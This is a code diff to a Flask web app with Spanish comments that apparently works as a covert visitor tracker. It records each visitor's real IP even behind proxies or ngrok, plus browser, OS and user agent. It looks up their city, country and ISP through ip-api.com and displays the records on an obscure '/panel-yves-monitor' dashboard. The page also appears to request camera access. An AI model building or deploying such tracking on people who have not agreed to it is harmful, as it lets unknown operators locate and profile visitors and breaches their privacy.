@@ -4,6 +4,7 @@ import socket
 import platform
 import json
 import pytz
+import requests
 from datetime import datetime
 
 app = Flask(__name__)
@@ -714,12 +715,69 @@ def index():
 @app.route('/send-data', methods=['GET'])
 def send_data():
 
+    # IP real incluso con proxy o ngrok
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0]
+    else:
+        ip = request.remote_addr
+
+    agent = request.headers.get("User-Agent")
+
+    # Detectar navegador
+    browser = "Desconocido"
+
+    if "Chrome" in agent and "Edg" not in agent:
+        browser = "Chrome"
+    elif "Firefox" in agent:
+        browser = "Firefox"
+    elif "Edg" in agent:
+        browser = "Edge"
+    elif "Safari" in agent and "Chrome" not in agent:
+        browser = "Safari"
+
+    # Detectar sistema operativo
+    os_system = "Desconocido"
+
+    if "Windows" in agent:
+        os_system = "Windows"
+    elif "Mac" in agent:
+        os_system = "MacOS"
+    elif "Linux" in agent:
+        os_system = "Linux"
+    elif "Android" in agent:
+        os_system = "Android"
+    elif "iPhone" in agent:
+        os_system = "iPhone"
+
+    # Hora México
+    mexico = pytz.timezone("America/Mexico_City")
+    current_time = datetime.now(mexico).strftime("%Y-%m-%d %H:%M:%S")
+
+    # Obtener ciudad, país e ISP desde API
+    city = "Desconocido"
+    country = "Desconocido"
+    isp = "Desconocido"
+
+    try:
+        geo = requests.get(
+        f"http://ip-api.com/json/{ip}?fields=country,city,isp",
+        timeout=3
+        ).json()
+        city = geo.get("city", "Desconocido")
+        country = geo.get("country", "Desconocido")
+        isp = geo.get("isp", "Desconocido")
+    except:
+        pass
+
     client_data = {
-        "time": str(datetime.now()),
-        "hostname": socket.gethostname(),
-        "platform": platform.system(),
-        "ip": request.remote_addr,
-        "agent": request.headers.get("User-Agent")
+        "time": current_time,
+        "ip": ip,
+        "browser": browser,
+        "platform": os_system,
+        "city": city,
+        "country": country,
+        "isp": isp,
+        "agent": agent
     }
 
     try:
@@ -736,7 +794,6 @@ def send_data():
     print("Nuevo acceso:", client_data)
 
     return {"status": "ok"}
-
 
 @app.route('/panel-yves-monitor')
 def dashboard():
@@ -763,13 +820,28 @@ def dashboard():
                 </div>
 
                 <div class="log-field">
+                <span class="label">PAÍS</span>
+                <span class="value">{log.get('country','—')}</span>
+                </div>
+
+                <div class="log-field">
+                <span class="label">CIUDAD</span>
+                <span class="value">{log.get('city','—')}</span>
+                </div>
+
+                <div class="log-field">
+                <span class="label">PROVEEDOR</span>
+                <span class="value truncate">{log.get('isp','—')}</span>
+                </div>
+
+                <div class="log-field">
                     <span class="label">SISTEMA</span>
                     <span class="value">{log.get('platform','—')}</span>
                 </div>
 
                 <div class="log-field">
                     <span class="label">NAVEGADOR</span>
-                    <span class="value truncate">{log.get('agent','—')}</span>
+                    <span class="value truncate">{log.get('browser','—')}</span>
                 </div>
 
                 <div class="log-field">
@@ -896,7 +968,7 @@ color:var(--text-dim);
 
 .log-grid{{
 display:grid;
-grid-template-columns:1fr 1fr 2fr 1fr;
+grid-template-columns:1fr 1fr 1fr 1fr 1fr 1fr 1fr;
 gap:20px;
 flex:1;
 }}
@@ -1027,3 +1099,4 @@ msg.innerText = "Permiso denegado o cámara no disponible";
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
+
